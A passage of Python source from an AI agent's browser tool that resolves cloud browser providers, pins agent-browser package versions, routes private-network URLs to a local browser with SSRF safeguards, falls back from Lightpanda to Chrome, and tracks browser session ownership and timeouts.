        browser_cfg = cfg.get("browser", {})
        if isinstance(browser_cfg, dict) and "cloud_provider" in browser_cfg:
            provider_key = normalize_browser_cloud_provider(
                browser_cfg.get("cloud_provider")
            )
            if provider_key in ("local", "camofox"):
                # Camofox runs through the built-in browser tools
                # (is_camofox_mode() dispatch), not a cloud provider.
                _cached_cloud_provider = None
                _cloud_provider_resolved = True
                return None
            if provider_key == "nous":
                # Managed "Nous Subscription" selection is serviced by the
                # Browser Use provider, whose config resolver routes it
                # through the managed browser-use gateway.
                provider_key = "browser-use"
        if provider_key:
            try:
                if _is_legacy_provider_registry_overridden():
                    # Test fixture path: honour the patched dict so the
                    # cache-policy unit tests keep working.
                    factory = _PROVIDER_REGISTRY.get(provider_key)
                    if factory is not None:
                        resolved = factory()
                else:
                    # Ensure plugins are discovered so the registry is
                    # populated. Idempotent — cheap on subsequent calls.
                    _ensure_browser_plugins_loaded()
                    resolved = _registry_get_browser_provider(provider_key)
                if resolved is None:
                    # Strict selection: a stored-but-unregistered name is an
                    # honest error, never a silent reroute to auto-detect.
                    from tools.tool_backend_helpers import selection_error

                    raise ValueError(selection_error(
                        "browser",
                        f"'{provider_key}'",
                        "no registered browser plugin has that name (install "
                        "the corresponding plugin or fix the config key "
                        "spelling)",
                    ))
            except ValueError:
                raise
            except Exception:
                logger.warning(
                    "Failed to instantiate explicit cloud_provider %r; will retry on next call",
                    provider_key,
                    exc_info=True,
                )
                return None
    except ValueError:
        raise
    except Exception as e:
        # Config file may be temporarily unreadable; still try auto-detect so
        # env-based / managed-gateway credentials can resolve. Don't pin cache.
        logger.debug("Could not read cloud_provider from config: %s", e)

    if resolved is None and provider_key is None:
        # Auto-detect path — permitted ONLY when no cloud_provider selection
        # was ever written: Browser Use first (managed Nous gateway or
        # direct API key), then Browserbase (direct credentials). Uses
        # the legacy class names imported at the top of this module so
        # tests that ``monkeypatch.setattr(browser_tool, "BrowserUseProvider", ...)``
        # keep driving this branch deterministically. Third-party browser
        # plugins are intentionally NOT reachable from auto-detect — they
        # participate only via explicit ``browser.cloud_provider: <name>``,
        # mirroring the firecrawl gate documented on
        # :data:`agent.browser_registry._LEGACY_PREFERENCE`.
        try:
            fallback_provider = BrowserUseProvider()
            if fallback_provider.is_configured():
                resolved = fallback_provider
            else:
                fallback_provider = BrowserbaseProvider()
                if fallback_provider.is_configured():
                    resolved = fallback_provider
        except Exception:  # pragma: no cover - defensive: never poison cache
            logger.debug("Cloud provider auto-detect failed", exc_info=True)
            return None

    if resolved is None:
        # Transient None — credentials may self-heal. Don't poison the cache.
        return None

    _cached_cloud_provider = resolved
    _cloud_provider_resolved = True
    return _cached_cloud_provider


from hermes_constants import is_termux as _is_termux_environment


def _browser_install_hint() -> str:
    package = f"'{AGENT_BROWSER_NPX_SPEC}'"
    if _is_termux_environment():
        return f"npm install -g {package} && agent-browser install"
    return f"npm install -g {package} && agent-browser install --with-deps"


# Sentinel _find_agent_browser returns/caches to mean "resolve via npx" rather
# than a concrete executable path. A named constant + predicate keep the six
# comparison sites (four here, plus hermes_cli/tools_config.py and
# hermes_cli/doctor.py) from drifting if the sentinel's exact spelling ever
# changes.
NPX_AGENT_BROWSER_SENTINEL = "npx agent-browser"

# Ordinary local/non-CDP browsing keeps the Node-22-compatible package line.
# Shared-CDP sessions select the separate capability package below only after
# a Node >=24 + agent-browser >=0.34 preflight. This keeps Hermes's documented
# Node >=22.22 floor honest instead of making every browser command inherit the
# newer package's Node requirement.
AGENT_BROWSER_NPX_SPEC = "agent-browser@0.26.0"

# v0.34.0 is the first release with official named-session CDP tab pinning.
# Keep automatic acquisition exact: the package is newer than the normal
# release-age gate, and a future patch must not inherit the scoped exception.
AGENT_BROWSER_PIN_TAB_NPX_SPEC = "agent-browser@0.34.0"
AGENT_BROWSER_PIN_TAB_MIN_VERSION = (0, 34, 0)
AGENT_BROWSER_PIN_TAB_MIN_NODE_MAJOR = 24
AGENT_BROWSER_NPX_MIN_RELEASE_AGE_DAYS = 14

# Failed capability probes are briefly cached so an unsupported shared-CDP
# setup does not fork agent-browser + Node probes on every model command.
AGENT_BROWSER_PIN_TAB_FAILURE_TTL_SECONDS = 5.0


class AgentBrowserCapabilityError(RuntimeError):
    """The discovered CLI/runtime cannot provide strict shared-CDP pinning."""


def _apply_agent_browser_npm_policy(
    env: Dict[str, str], *, pin_tab_acquisition: bool = False
) -> Dict[str, str]:
    """Apply Hermes's npm policy to one agent-browser npx subprocess.

    Ordinary acquisition keeps the repository's 14-day gate. Strict CDP
    pinning uses the exact, clean-room-tested 0.34.0 package and temporarily
    sets the gate to zero for that one acquisition. Otherwise an empty cache
    cannot install the security capability until wall-clock age crosses the
    cutoff.
    """
    env["npm_config_engine_strict"] = "true"
    env["npm_config_min_release_age"] = str(
        0 if pin_tab_acquisition else AGENT_BROWSER_NPX_MIN_RELEASE_AGE_DAYS
    )
    return env


def _is_npx_agent_browser_sentinel(browser_cmd: str) -> bool:
    return browser_cmd.strip() == NPX_AGENT_BROWSER_SENTINEL


def _requires_real_termux_browser_install(browser_cmd: str) -> bool:
    return _is_termux_environment() and _is_local_mode() and _is_npx_agent_browser_sentinel(browser_cmd)


def _termux_browser_install_error() -> str:
    return (
        "Local browser automation on Termux cannot rely on the bare npx fallback. "
        f"Install agent-browser explicitly first: {_browser_install_hint()}"
    )


def _is_local_mode() -> bool:
    """Return True when the browser tool will use a local browser backend."""
    if _get_cdp_override_raw():
        return False
    return _get_cloud_provider() is None


def _is_local_backend() -> bool:
    """Return True when the browser runs locally AND the terminal is also local.

    SSRF protection is only meaningful for cloud backends (Browserbase,
    BrowserUse) where the agent could reach internal resources on a remote
    machine.  For local backends — Camofox, or the built-in headless
    Chromium without a cloud provider — the user already has full terminal
    and network access on the same machine, so the check adds no security
    value.

    However, when the terminal runs in a container (docker, modal, daytona,
    ssh, singularity), the browser on the host can access internal networks
    that the terminal cannot.  In this case, SSRF protection should be
    enabled even though the browser is technically "local".
    """
    # A CDP override points the browser at a separate Chrome process whose
    # network position is not guaranteed to match the terminal (it may live
    # off-host). Don't treat it as a trusted local backend — otherwise a
    # model-driven navigate could reach internal/metadata services reachable
    # from the CDP host but not the terminal. This MUST be checked before the
    # camofox short-circuit below so a Camofox backend combined with a CDP
    # override still fails the local check instead of returning local and
    # skipping the private/internal SSRF gate. The override is honored from
    # either the BROWSER_CDP_URL env var or a persistent `browser.cdp_url`
    # config (both via _get_cdp_override(), and both now suppress camofox in
    # browser_camofox.py). _is_local_mode() already treats any CDP override as
    # non-local; keep the two helpers in agreement.
    if _get_cdp_override_raw():
        return False
    if _is_camofox_mode():
        return True
    if _get_cloud_provider() is not None:
        return False
    # When terminal runs in a container, browser on host can access
    # internal networks the terminal can't → treat as non-local.
    terminal_backend = os.getenv("TERMINAL_ENV", "local").strip().lower()
    return terminal_backend in ("local", "")


_auto_local_for_private_urls_resolved = False
_cached_auto_local_for_private_urls: bool = True


def _get_browser_engine() -> str:
    """Return the configured browser engine (``auto``, ``lightpanda``, or ``chrome``).

    Reads ``config["browser"]["engine"]`` once and caches the result.
    Falls back to the ``AGENT_BROWSER_ENGINE`` env var, then ``auto``.

    ``auto`` means: don't pass ``--engine`` at all (agent-browser defaults to
    Chrome).  ``lightpanda`` or ``chrome`` are forwarded as
    ``--engine <value>`` to agent-browser v0.25.3+.

    Lightpanda is 1.3-5.8x faster on navigation but has no graphical
    renderer (no screenshots).
    """
    global _cached_browser_engine, _browser_engine_resolved
    if _browser_engine_resolved:
        return _cached_browser_engine

    _browser_engine_resolved = True
    _cached_browser_engine = "auto"  # safe default

    # Config file takes priority
    try:
        from hermes_cli.config import read_raw_config
        cfg = read_raw_config()
        val = cfg.get("browser", {}).get("engine")
        if val and str(val).strip():
            _cached_browser_engine = str(val).strip().lower()
    except Exception as e:
        logger.debug("Could not read browser.engine from config: %s", e)

    # Fall back to env var (only if config didn't set a value)
    if _cached_browser_engine == "auto":
        env_val = os.environ.get("AGENT_BROWSER_ENGINE", "").strip().lower()
        if env_val:
            _cached_browser_engine = env_val

    # Validate: agent-browser only accepts "chrome" and "lightpanda".
    _VALID_ENGINES = {"auto", "lightpanda", "chrome"}
    if _cached_browser_engine not in _VALID_ENGINES:
        logger.warning(
            "Unknown browser engine %r (valid: %s), falling back to 'auto'",
            _cached_browser_engine, ", ".join(sorted(_VALID_ENGINES)),
        )
        _cached_browser_engine = "auto"

    return _cached_browser_engine


_cached_headed_mode: Optional[bool] = None
_headed_mode_resolved = False


def _is_headed_mode() -> bool:
    """Return True when the browser should launch in headed (visible) mode.

    Reads ``config["browser"]["headed"]`` with ``AGENT_BROWSER_HEADED`` env
    var as fallback.  Result is cached after the first call.
    """
    global _cached_headed_mode, _headed_mode_resolved
    if _headed_mode_resolved:
        return _cached_headed_mode  # type: ignore[return-value]

    _headed_mode_resolved = True
    _cached_headed_mode = False

    try:
        from hermes_cli.config import read_raw_config
        cfg = read_raw_config()
        val = cfg.get("browser", {}).get("headed")
        if val is not None:
            _cached_headed_mode = str(val).strip().lower() in ("true", "1", "yes")
    except Exception as e:
        logger.debug("Could not read browser.headed from config: %s", e)

    if not _cached_headed_mode:
        env_val = os.environ.get("AGENT_BROWSER_HEADED", "").strip()
        if env_val and env_val.lower() in ("true", "1", "yes"):
            _cached_headed_mode = True

    return _cached_headed_mode


def _should_inject_engine(engine: str) -> bool:
    """Return True when the engine flag should be added to agent-browser commands.

    Only inject ``--engine`` for non-cloud, non-camofox local sessions where
    the engine is explicitly set (not ``auto``).
    """
    if engine == "auto":
        return False
    if _is_camofox_mode():
        return False
    return _is_local_mode()


def _using_lightpanda_engine() -> bool:
    """Return True when local browser commands are configured for Lightpanda."""
    return _get_browser_engine() == "lightpanda"


def _lightpanda_fallback_reason(engine: str, command: str, result: Dict[str, Any]) -> Optional[str]:
    """Return the user-visible reason a Lightpanda result needs Chrome fallback.

    ``None`` means no fallback should run.  The returned string is copied into
    the fallback result so CLI/TUI/gateway users can see when Hermes silently
    switched from Lightpanda to Chrome for completeness.
    """
    if engine != "lightpanda":
        return None

    # Only retry commands where Chrome can meaningfully produce a different
    # result. Session-management commands (close, record) are tied to the
    # engine's daemon and can't be retried on a different engine.
    _FALLBACK_ELIGIBLE = {"open", "snapshot", "screenshot", "eval", "click",
                          "fill", "scroll", "back", "press", "console", "errors"}
    if command not in _FALLBACK_ELIGIBLE:
        return None

    # Explicit failure
    if not result.get("success"):
        error = str(result.get("error") or "command failed").strip()
        return f"Lightpanda {command!r} failed ({error}); retried with Chrome."

    data = result.get("data", {})

    if command == "snapshot":
        snap = data.get("snapshot", "")
        # Empty or near-empty snapshots indicate Lightpanda couldn't render
        if not snap or len(snap.strip()) < 20:
            return "Lightpanda returned an empty/too-short snapshot; retried with Chrome."

    if command == "screenshot":
        # Lightpanda returns a placeholder PNG with its panda logo.
        # Since LP PR #1766 resized it to 1920x1080, the placeholder is
        # ~17 KB.  Real Chromium screenshots are typically 100 KB+.
        path = data.get("path", "")
        if path:
            try:
                size = os.path.getsize(path)
                if size < 20480:
                    logger.debug("Lightpanda screenshot is suspiciously small (%d bytes), "
                                 "triggering Chrome fallback", size)
                    return (
                        f"Lightpanda screenshot was suspiciously small ({size} bytes); "
                        "retried with Chrome."
                    )
            except OSError:
                return "Lightpanda screenshot file was missing/unreadable; retried with Chrome."

    return None


def _needs_lightpanda_fallback(engine: str, command: str, result: Dict[str, Any]) -> bool:
    """Check if a Lightpanda result should trigger an automatic Chrome fallback."""
    return _lightpanda_fallback_reason(engine, command, result) is not None


def _annotate_lightpanda_fallback(result: Dict[str, Any], reason: str) -> Dict[str, Any]:
    """Add a user-visible Chrome fallback warning to a browser command result."""
    warning = (
        "⚠ Lightpanda fallback: Chrome was used for this browser action. "
        f"{reason}"
    )
    annotated = dict(result)
    annotated["fallback_warning"] = warning
    annotated["browser_engine"] = "chrome"
    annotated["browser_engine_fallback"] = {
        "from": "lightpanda",
        "to": "chrome",
        "reason": reason,
    }
    data = annotated.get("data")
    if isinstance(data, dict):
        data = dict(data)
        data.setdefault("fallback_warning", warning)
        data.setdefault("browser_engine", "chrome")
        data.setdefault(
            "browser_engine_fallback",
            {"from": "lightpanda", "to": "chrome", "reason": reason},
        )
        annotated["data"] = data
    return annotated


def _copy_fallback_warning(target: Dict[str, Any], result: Dict[str, Any]) -> Dict[str, Any]:
    """Copy browser metadata that must survive high-level response shaping."""
    # Preserve terminal ownership failures for the model, but do not
    # automatically adopt, create, or open a replacement tab.
    if result.get("code") in {"tab_gone", "browser_session_retired"}:
        target["code"] = result["code"]
        if "data" in result:
            target["data"] = result["data"]
    if result.get("fallback_warning"):
        target["fallback_warning"] = result["fallback_warning"]
        target["browser_engine"] = result.get("browser_engine")
        target["browser_engine_fallback"] = result.get("browser_engine_fallback")
    return target


def _run_chrome_fallback_command(
    task_id: str,
    command: str,
    args: List[str],
    timeout: int,
) -> Dict[str, Any]:
    """Run a browser command in a temporary Chrome session at the current URL.

    agent-browser locks the engine when a named daemon starts. Passing
    ``--engine chrome`` to the same Lightpanda ``--session`` cannot change that
    running daemon. This helper always uses a fresh temporary Chrome session,
    navigates it to the current Lightpanda URL, runs ``command``, then tears it
    down.
    """
    import uuid

    # 1. Grab the current URL from the Lightpanda session. Use
    # ``_engine_override=\"auto\"`` so this helper does not recursively trigger
    # Lightpanda→Chrome fallback if the eval call itself fails.
    url_result = _run_browser_command(
        task_id, "eval", ["window.location.href"], timeout=10, _engine_override="auto"
    )
    current_url = None
    if url_result.get("success"):
        current_url = url_result.get("data", {}).get("result", "").strip().strip('"').strip("'")
    if not current_url:
        logger.warning("Chrome fallback: could not determine current URL from LP session")
        return {"success": False, "error": "Chrome fallback failed: could not determine current URL"}

    # 2. Create a temporary Chrome session (bypasses _get_session_info's cache).
    tmp_session = f"h_cfb_{uuid.uuid4().hex[:8]}"
    try:
        browser_cmd = _find_agent_browser()
    except FileNotFoundError as e:
        return {"success": False, "error": str(e)}

    if not _chromium_installed():
        if _running_in_docker():
            hint = (
                "Chrome fallback requires Chromium, but it is missing. "
                "You're running in Docker — pull the latest image: "
                "docker pull ghcr.io/nousresearch/hermes-agent:latest"
            )
        else:
            hint = (
                "Chrome fallback requires Chromium, but it is missing. Install it with: "
                "npx agent-browser install --with-deps "
                "(or: npx playwright install --with-deps chromium)"
            )
        return {"success": False, "error": hint}

    # Resolve npx via the same PATH + extended-PATH cascade _find_agent_browser
    # uses, not a bare shutil.which("npx") — Hermes-managed-Node-only setups
    # resolve npx only through the extended fallback path, and a bare lookup
    # would let a broken system npx shadow a healthy managed one. If npx isn't
    # found at all (Termux, bare container), fall back to the bare name and
    # let Popen raise with a readable "FileNotFoundError: 'npx'" rather than
    # WinError 193.
    if _is_npx_agent_browser_sentinel(browser_cmd):
        _npx_bin = _resolve_npx_bin() or "npx"
        # --ignore-scripts is retained as defense in depth even though Hermes
        # acquires one exact, reviewed agent-browser version here.
        cmd_prefix = [_npx_bin, "--ignore-scripts", "--prefer-offline", "-y", AGENT_BROWSER_NPX_SPEC]
    else:
        cmd_prefix = [browser_cmd]
    base_args = cmd_prefix + ["--engine", "chrome", "--session", tmp_session, "--json"]

    task_socket_dir = os.path.join(_socket_safe_tmpdir(), f"agent-browser-{tmp_session}")
    os.makedirs(task_socket_dir, mode=0o700, exist_ok=True)
    browser_env = _build_browser_env()
    if _is_npx_agent_browser_sentinel(browser_cmd):
        _apply_agent_browser_npm_policy(browser_env)
    browser_env["AGENT_BROWSER_SOCKET_DIR"] = task_socket_dir
    browser_env["PATH"] = _merge_browser_path(browser_env.get("PATH", ""))

    if "AGENT_BROWSER_IDLE_TIMEOUT_MS" not in browser_env:
        browser_env["AGENT_BROWSER_IDLE_TIMEOUT_MS"] = str(BROWSER_SESSION_INACTIVITY_TIMEOUT * 1000)

    def _run_tmp(cmd: str, cmd_args: List[str]) -> Dict[str, Any]:
        full = base_args + [cmd] + cmd_args
        # Use temp-file stdout/stderr pattern (same as _run_browser_command)
        # to avoid pipe hang from agent-browser daemon inheriting fds.
        stdout_path = os.path.join(task_socket_dir, f"_stdout_{cmd}")
        stderr_path = os.path.join(task_socket_dir, f"_stderr_{cmd}")
        stdout_fd = os.open(stdout_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        stderr_fd = os.open(stderr_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        try:
            # On Windows, launch the child in a new process group so parent
            # console Ctrl+C doesn't kill it with STATUS_CONTROL_C_EXIT
            # (0xC000013A = rc 3221225786), AND insulate its stdio + handle
            # inheritance from the parent.
            #
            # Additional Windows hardening beyond CREATE_NEW_PROCESS_GROUP:
            # * STARTF_USESTDHANDLES + explicit handles → CreateProcess hands
            #   the child ONLY our three chosen handles (DEVNULL stdin +
            #   temp-file stdout/stderr). Without this, some parents leak
            #   console handles that break downstream grandchild spawns — the
            #   agent-browser Rust binary spawns a detached daemon grandchild,
            #   and that grandchild's CreateProcess dies silently
            #   ("Daemon process exited during startup with no error output")
            #   when inherited parent handles are in a weird state. Observed
            #   in the Hermes CLI where sys.stdout and sys.stderr both report
            #   fileno=1 (stderr dup'd onto stdout at the OS level).
            # * close_fds=True → block inheritance of every other handle.
            #   (Default on POSIX; must be explicit on Windows for stdio.)
            _popen_extra: dict = {}
            if os.name == "nt":
                # CREATE_NO_WINDOW → don't attach a console (cmd.exe would
                # otherwise briefly allocate one for the .cmd shim).
                # Do NOT add CREATE_NEW_PROCESS_GROUP: on Python 3.11 Windows
                # it interacts with asyncio's ProactorEventLoop such that the
                # subprocess creation cancels the running loop task, which
                # surfaces as KeyboardInterrupt in app.run() and tears down
                # the CLI mid-turn. The agent thread's subprocess spawn
                # unwound MainThread's prompt_toolkit loop that way — see
                # diag log: "asyncio.CancelledError → KeyboardInterrupt".
                _popen_extra["creationflags"] = windows_hide_flags()
                _popen_extra["close_fds"] = True
                _si = subprocess.STARTUPINFO()
                _si.dwFlags |= subprocess.STARTF_USESTDHANDLES
                _popen_extra["startupinfo"] = _si
            proc = subprocess.Popen(
                full, stdout=stdout_fd, stderr=stderr_fd,
                stdin=subprocess.DEVNULL, env=browser_env,
                **_popen_extra,
            )
        finally:
            os.close(stdout_fd)
            os.close(stderr_fd)
        try:
            proc.wait(timeout=timeout)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
            return {"success": False, "error": f"Chrome fallback '{cmd}' timed out"}
        try:
            with open(stdout_path, "r", encoding="utf-8") as f:
                stdout = f.read().strip()
            if stdout:
                return json.loads(stdout.split("\n")[-1])
        except Exception as exc:
            logger.debug("Chrome fallback tmp cmd '%s' error: %s", cmd, exc)
        finally:
            for pth in (stdout_path, stderr_path):
                try:
                    os.unlink(pth)
                except OSError:
                    pass
        return {"success": False, "error": f"Chrome fallback '{cmd}' failed"}

    try:
        # 3. Navigate Chrome to the same URL.
        nav = _run_tmp("open", [current_url])
        if not nav.get("success"):
            logger.warning("Chrome fallback: navigate failed: %s", nav.get("error"))
            return {"success": False, "error": f"Chrome fallback navigate failed: {nav.get('error')}"}

        # 4. Run the requested command in Chrome.
        return _run_tmp(command, args)

    finally:
        # 5. Tear down the temporary Chrome session.
        try:
            _run_tmp("close", [])
        except Exception:
            pass
        # Clean up socket directory
        import shutil as _shutil
        _shutil.rmtree(task_socket_dir, ignore_errors=True)


def _chrome_fallback_screenshot(
    task_id: str,
    args: List[str],
    timeout: int,
) -> Dict[str, Any]:
    """Take a screenshot using a temporary Chrome session."""
    return _run_chrome_fallback_command(task_id, "screenshot", args, timeout)


def _auto_local_for_private_urls() -> bool:
    """Return whether a cloud-configured install should auto-spawn a local
    Chromium for LAN/localhost URLs.

    Reads ``browser.auto_local_for_private_urls`` once (default ``True``) and
    caches it for the process lifetime.  When enabled, ``browser_navigate``
    routes URLs whose host resolves to a private/loopback/LAN address to a
    local headless Chromium sidecar even when a cloud provider (Browserbase
    / Browser-Use / Firecrawl) is configured globally.  Public URLs continue
    to use the cloud provider in the same conversation.
    """
    global _auto_local_for_private_urls_resolved, _cached_auto_local_for_private_urls
    if _auto_local_for_private_urls_resolved:
        return _cached_auto_local_for_private_urls

    _auto_local_for_private_urls_resolved = True
    try:
        from hermes_cli.config import read_raw_config
        cfg = read_raw_config()
        browser_cfg = cfg.get("browser", {})
        if isinstance(browser_cfg, dict) and "auto_local_for_private_urls" in browser_cfg:
            _cached_auto_local_for_private_urls = bool(
                browser_cfg.get("auto_local_for_private_urls")
            )
    except Exception as e:
        logger.debug("Could not read auto_local_for_private_urls from config: %s", e)
    return _cached_auto_local_for_private_urls


def _url_is_private(url: str) -> bool:
    """Return True when the URL's host resolves to a private/LAN/loopback address.

    Reuses ``tools.url_safety.is_safe_url`` as the oracle — if the SSRF check
    would reject the URL, we treat it as "private" for routing purposes.  DNS
    resolution failures are treated as NOT private (fall through to whatever
    backend is configured, which will surface the DNS error naturally).
    """
    try:
        # is_safe_url returns False for private/loopback/link-local/CGNAT AND
        # for DNS failures.  We only want the private-network case here, so
        # we parse + check the host shape as a DNS-failure sieve first.
        from urllib.parse import urlparse
        import ipaddress
        import socket
        parsed = urlparse(url)
        hostname = (parsed.hostname or "").strip().lower().rstrip(".")
        if not hostname:
            return False
        # Literal IP → check directly
        try:
            ip = ipaddress.ip_address(hostname)
            return (
                ip.is_private
                or ip.is_loopback
                or ip.is_link_local
                # 172.16.0.0/12: only covered by ip.is_private on Python
                # ≥3.11 (bpo-40791).  Explicit check keeps 3.10 runtimes
                # routing these to the local sidecar correctly.
                or ip in ipaddress.ip_network("172.16.0.0/12")
                or ip in ipaddress.ip_network("100.64.0.0/10")
            )
        except ValueError:
            pass
        # Hostname — must resolve to confirm it's private (bare "localhost"
        # resolves to 127.0.0.1 via /etc/hosts).  Short-circuit on obvious
        # names to avoid a DNS hop.
        if hostname in {"localhost",} or hostname.endswith(".localhost"):
            return True
        if hostname.endswith(".local") or hostname.endswith(".lan") or hostname.endswith(".internal"):
            return True
        try:
            addr_info = socket.getaddrinfo(hostname, None, socket.AF_UNSPEC, socket.SOCK_STREAM)
        except socket.gaierror:
            return False  # DNS fail → not private, let the normal path fail
        for _, _, _, _, sockaddr in addr_info:
            try:
                ip = ipaddress.ip_address(sockaddr[0])
            except ValueError:
                continue
            if (
                ip.is_private
                or ip.is_loopback
                or ip.is_link_local
                or ip in ipaddress.ip_network("100.64.0.0/10")
            ):
                return True
        return False
    except Exception as exc:
        logger.debug("URL-privacy check failed for %s: %s", url, exc)
        return False


def _navigation_session_key(task_id: str, url: str) -> str:
    """Pick the session key that should handle ``url`` for ``task_id``.

    Returns the bare task_id unless ALL of these are true:
      1. A cloud provider is configured (``_get_cloud_provider()`` is not None).
      2. Auto-local routing is enabled (``browser.auto_local_for_private_urls``,
         default True).
      3. The URL resolves to a private/LAN/loopback address.
      4. A CDP override is not active (that path owns the whole session).
      5. Camofox mode is not active (Camofox is already local-only).

    When all are true, returns ``f"{task_id}::local"`` so the hybrid-routing
    path spawns a local Chromium sidecar while the cloud session (if any)
    continues to serve public URLs.
    """
    if task_id is None:
        task_id = "default"
    if _get_cdp_override_raw():
        return task_id
    if _is_camofox_mode():
        return task_id
    if _get_cloud_provider() is None:
        return task_id
    if not _auto_local_for_private_urls():
        return task_id
    if not _url_is_private(url):
        return task_id
    return f"{task_id}{_LOCAL_SUFFIX}"


def _is_local_sidecar_key(session_key: str) -> bool:
    """Return True when ``session_key`` is a hybrid-routing local sidecar."""
    return session_key.endswith(_LOCAL_SUFFIX)


def _bare_task_id_for_session_key(session_key: str) -> str:
    """Return the owning bare task id for an opaque browser session key."""
    if _is_local_sidecar_key(session_key):
        return session_key[: -len(_LOCAL_SUFFIX)]
    return session_key


def _session_info_owned_by_task(session_info: Dict[str, Any], task_id: str, session_key: str) -> bool:
    """Return whether ``session_info`` still belongs to ``task_id``/``session_key``.

    Sessions created by current code carry explicit ownership metadata. Treat
    older in-memory entries without those fields as valid for hot-reload/test
    compatibility, but reject any explicit mismatch before a non-navigation
    tool can act on the wrong tab/session.
    """
    owner = session_info.get("owner_task_id")
    key = session_info.get("session_key")
    if owner is not None and owner != task_id:
        return False
    if key is not None and key != session_key:
        return False
    return True


def _last_session_key(task_id: str) -> str:
    """Return the live session key to use for a non-nav browser tool call.

    ``browser_navigate`` records which concrete session key served a task's
    most recent successful navigation. Non-navigation tools must reuse that key
    so click/fill/snapshot land in the same browser. If ownership metadata no
    longer matches, drop the stale binding instead of mutating the wrong
    browser. Successful terminal cleanup separately tombstones the bare task,
    so falling back to that key cannot recreate a blank replacement session.
    """
    if task_id is None:
        task_id = "default"
    recorded_key = _last_active_session_key.get(task_id)
    if not recorded_key:
        return task_id
    with _cleanup_lock:
        session_info = _active_sessions.get(recorded_key)
        if session_info and _session_info_owned_by_task(session_info, task_id, recorded_key):
            return recorded_key
        _last_active_session_key.pop(task_id, None)
    logger.debug(
        "browser session ownership: dropping stale/mismatched last-active binding %s -> %s",
        task_id,
        recorded_key,
    )
    return task_id


def _allow_private_urls() -> bool:
    """Return whether the browser is allowed to navigate to private/internal addresses.

    Reads ``config["browser"]["allow_private_urls"]``. Single-profile calls
    cache the result for the process lifetime; multiplexed profile turns resolve
    their context-local config on each call. Defaults to ``False`` (SSRF
    protection active).
    """
    global _cached_allow_private_urls, _allow_private_urls_resolved

    # The profile multiplexer scopes config with a ContextVar while sharing
    # this module. Never reuse another profile's private-network opt-out.
    if get_hermes_home_override() is not None:
        return _resolve_allow_private_urls()

    if _allow_private_urls_resolved:
        return _cached_allow_private_urls

    _allow_private_urls_resolved = True
    _cached_allow_private_urls = _resolve_allow_private_urls()
    return _cached_allow_private_urls


def _resolve_allow_private_urls() -> bool:
    """Read the browser private-URL toggle from the active config scope."""
    try:
        from hermes_cli.config import read_raw_config
        cfg = read_raw_config()
        browser_cfg = cfg.get("browser", {})
        if isinstance(browser_cfg, dict):
            return is_truthy_value(
                browser_cfg.get("allow_private_urls"), default=False
            )
    except Exception as e:
        logger.debug("Could not read allow_private_urls from config: %s", e)
    return False


def _socket_safe_tmpdir() -> str:
    """Return a short temp directory path suitable for Unix domain sockets.

    macOS sets ``TMPDIR`` to ``/var/folders/xx/.../T/`` (~51 chars).  When we
    append ``agent-browser-hermes_…`` the resulting socket path exceeds the
    104-byte macOS limit for ``AF_UNIX`` addresses, causing agent-browser to
    fail with "Failed to create socket directory" or silent screenshot failures.

    Linux ``tempfile.gettempdir()`` already returns ``/tmp``, so this is a
    no-op there.  On macOS we bypass ``TMPDIR`` and use ``/tmp`` directly
    (symlink to ``/private/tmp``, sticky-bit protected, always available).
    """
    if sys.platform == "darwin":
        return "/tmp"
    return tempfile.gettempdir()


# Track active sessions per "session key".
#
# A "session key" is either the bare task_id (cloud/default path) OR a composite
# like f"{task_id}::local" when the hybrid-routing feature spawns a local sidecar
# browser for a LAN/localhost URL while a cloud provider is configured globally.
# Both forms flow through the same _active_sessions / _run_browser_command /
# cleanup_browser code paths — the key is opaque to those internals.
#
# Stores: session_name (always), bb_session_id + cdp_url (cloud mode only)
_active_sessions: Dict[str, Dict[str, Any]] = {}  # session_key -> {session_name, ...}
_recording_sessions: set = set()  # session_keys with active recordings

# Tracks the most recent session_key used per task_id. Set by browser_navigate()
# after it chooses a backend for a URL; read by every non-nav browser tool
# (snapshot/click/fill/eval/...) so they target the session that served the last
# navigation.  Without this, a task that navigated to localhost on the local
# sidecar would fall back to the cloud session on its next snapshot call.
_last_active_session_key: Dict[str, str] = {}  # task_id -> session_key
_LOCAL_SUFFIX = "::local"


class BrowserCleanupReason(str, Enum):
    """Why browser ownership is being torn down."""

    TERMINAL = "terminal"
    INACTIVITY = "inactivity"
    PROVIDER_EXPIRY = "provider_expiry"
    RESTART_ROLLBACK = "restart_rollback"


class BrowserTaskState(str, Enum):
    """Process-local lifecycle for one bare browser task."""

    STARTING = "starting"
    ACTIVE = "active"
    RETIRING = "retiring"
    RETIRED = "retired"


class OrphanTargetOwnership(str, Enum):
    """Confidence in exact target ownership recovered from daemon metadata."""

    PINNED = "pinned"
    CONFIRMED_UNPINNED = "confirmed_unpinned"
    UNKNOWN = "unknown"


@dataclass(frozen=True)
class _PendingProviderCleanup:
    """Provider session identity retained until close is confirmed."""

    task_id: str
    provider: Any
    session_id: str

# Successful terminal cleanup leaves a task tombstone so a later non-navigation
# command cannot silently recreate a blank session. Explicit browser_navigate
# is the only operation that clears the tombstone. Process-local by design:
# task/session ownership is process-local too, and no state must survive restart.
_retired_browser_tasks: set[str] = set()

# Flag to track if cleanup has been done
_cleanup_done = False

# =============================================================================
# Inactivity Timeout Configuration
# =============================================================================

# Session inactivity timeout (seconds) - cleanup if no activity for this long.
# config.yaml is authoritative; BROWSER_INACTIVITY_TIMEOUT remains a legacy
# fallback so old deployments keep working if they have not migrated yet.
DEFAULT_SESSION_INACTIVITY_TIMEOUT = int(
    DEFAULT_CONFIG.get("browser", {}).get("inactivity_timeout", 120)
)


def _get_session_inactivity_timeout() -> int:
    result = env_int("BROWSER_INACTIVITY_TIMEOUT", DEFAULT_SESSION_INACTIVITY_TIMEOUT)
    try:
        from hermes_cli.config import read_raw_config
        cfg = read_raw_config()
        val = cfg_get(cfg, "browser", "inactivity_timeout")
        if val is not None:
            result = max(int(val), 30)  # Floor at 30s to avoid instant reaping
    except Exception as e:
        logger.debug("Could not read inactivity_timeout from config: %s", e)
    return result


BROWSER_SESSION_INACTIVITY_TIMEOUT = _get_session_inactivity_timeout()

# How often the cleanup thread re-runs the orphan reaper.  The reaper used to
# run exactly once, before the cleanup loop started, which meant a hermes
# process that stays up for days could never recover from a leak that appeared
# *after* boot.  Observed in the wild: five agent-browser daemons accumulated
# over 10 days in a single 18-day-uptime process, pinning ~5 CPU cores.
